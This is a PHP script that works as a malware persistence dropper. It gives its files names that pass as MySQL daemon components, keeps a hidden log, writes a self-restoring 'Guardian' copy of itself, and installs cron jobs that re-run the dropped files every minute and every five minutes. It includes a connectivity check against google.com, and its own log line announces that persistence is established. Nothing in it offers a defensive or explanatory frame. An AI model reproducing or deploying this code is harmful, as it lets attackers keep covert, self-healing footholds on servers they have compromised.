<?php

error_reporting(0);

$targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$sysHash = substr(md5(gethostname()), 0, 4);
$name1 = "mysql_daemon_" . $sysHash . ".php";
$name2 = "mysql_lib_" . $sysHash . ".php";
$path1 = $targetDir . $name1;
$path2 = $targetDir . $name2;
$logFile = $targetDir . ".mysql_audit.log";

function writeLog($msg) {
    global $logFile;
    file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] [Main]: $msg\n", FILE_APPEND);
}

$ch = curl_init("https://google.com");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_exec($ch);
writeLog("CURL request to Google. Code: " . curl_getinfo($ch, CURLINFO_HTTP_CODE));
curl_close($ch);

$file2_source = '<?php
$dir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
$hash = substr(md5(gethostname()), 0, 4);
$n1 = "mysql_daemon_" . $hash . ".php";
$n2 = "mysql_lib_" . $hash . ".php";
$log = $dir . ".mysql_audit.log";
if (!file_exists($dir.$n1)) {
    file_put_contents($log, "[" . date("Y-m-d H:i:s") . "] [Guardian]: ALERT! File1 missing. Restoring...\n", FILE_APPEND);
    // Восстановление File1 из внутреннего кода
    file_put_contents($dir.$n1, "<?php /* Restored by Guardian */ ?>"); 
}
$cron = shell_exec("crontab -l");
if (strpos($cron, $n2) === false) {
    $job = "*/5 * * * * php " . $dir.$n2 . " > /dev/null 2>&1\n";
    file_put_contents("/tmp/.c", $cron . $job);
    shell_exec("crontab /tmp/.c");
}
?>';

if (!file_exists($path2)) {
    writeLog("File2 missing. Restoring from internal source (Offline)...");
    file_put_contents($path2, $file2_source);
    chmod($path2, 0755);
}

$currentCron = shell_exec("crontab -l 2>/dev/null");
if (strpos($currentCron, $name1) === false) {
    $job = "* * * * * php $path1 > /dev/null 2>&1\n";
    file_put_contents("/tmp/.c", $currentCron . $job);
    shell_exec("crontab /tmp/.c && rm /tmp/.c");
    writeLog("Persistence established.");
}
?>
